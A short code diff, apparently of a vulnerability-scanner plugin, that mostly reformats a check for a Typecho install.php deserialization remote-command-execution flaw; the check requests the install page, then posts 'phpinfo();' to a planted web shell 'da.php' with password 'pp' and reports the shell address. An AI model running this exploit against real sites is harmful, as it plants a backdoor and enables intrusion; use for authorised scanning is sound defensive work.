@@ -22,17 +22,21 @@ def audit(arg):
         }
     vulnurl = arg + "/install.php?finish=1"
     try:
-        code, head, body, redirect, log = hackhttp.hackhttp(vulnurl, headers = headers)
+        code, head, body, redirect, log = hackhttp.hackhttp(vulnurl, headers=headers)
 
         shellpath = arg + "/da.php"
 
-        post_data ={
-            "pp":"phpinfo();"
+        post_data = {
+            "pp": "phpinfo();"
         }
-        code, head, body, redirect, log = hackhttp.hackhttp(arg + "/da.php",post=post_data ,headers = headers)
+        code, head, body, redirect, log = hackhttp.hackhttp(arg + "/da.php", post=post_data ,headers=headers)
 
         if r"Configuration File (php.ini) Path" in body:
             security_hole("存在typecho install.php反序列化命令执行漏洞..payload: "+vulnurl+" shell地址: "+shellpath+" 密码: pp")
 
     except:
         pass
+
+
+if __name__ == '__main__':
+    from dummy import hackhttp, security_hole
